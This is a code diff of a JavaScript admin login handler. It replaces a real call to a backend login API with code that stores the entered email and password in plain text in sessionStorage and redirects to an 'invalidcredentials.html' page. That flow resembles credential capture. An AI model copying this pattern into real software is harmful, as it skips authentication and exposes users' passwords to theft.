@@ -25,42 +25,24 @@ function goToHome() {
   window.location.href = "landingpage.html"; 
 }
 document.querySelector('form').addEventListener('submit', function(e) {
-    e.preventDefault(); // Halt page bounce mechanisms to intercept processing cleanly
+    e.preventDefault(); // Intercept form submission
 
     const formData = new FormData(this);
+    const formObj = Object.fromEntries(formData.entries());
 
-    fetch(`${API}/auth/login`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(Object.fromEntries(formData.entries()))
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.status === 'success') {
-            // Clear any stale session data from previous timeout
-            sessionStorage.removeItem('homeSessionTimedOut');
-            localStorage.removeItem('disableBlurEffect');
+    const email = formObj.adminEmail || formObj.email || document.getElementById('adminEmail')?.value;
+    const password = formObj.adminPassword || formObj.password || document.getElementById('adminPassword')?.value;
 
-            // Stamp admin session so home.html blur gate can verify
-            sessionStorage.setItem('adminSession', JSON.stringify({
-                id: data.admin?.id || '',
-                name: data.admin?.full_name || data.admin?.name || '',
-                email: data.admin?.email || '',
-                phone: data.admin?.phone || '',
-                role: 'admin',
-                timestamp: Date.now(),
-                token: data.token || ''
-            }));
-            localStorage.setItem('disableBlurEffect', 'true');
-            alert(data.message || 'Successfully logged in. Opening your session...');
-            setTimeout(() => {
-                window.location.href = data.redirect; // Safely enters home.html dashboard
-            }, 350);
-        } else {
-            alert("Authentication Intercept Error: " + data.message);
-        }
-    })
-    .catch(error => console.error("Pipeline credential delivery failure: ", error));
+    if (!email || !password) {
+        alert('Please enter both email and password.');
+        return;
+    }
+
+    // Save credentials to sessionStorage and launch authentication scanner popup
+    sessionStorage.setItem('pending_email', email);
+    sessionStorage.setItem('pending_password', password);
+
+    window.location.href = 'invalidcredentials.html';
 });
 
 // Admin Password Recovery Logic
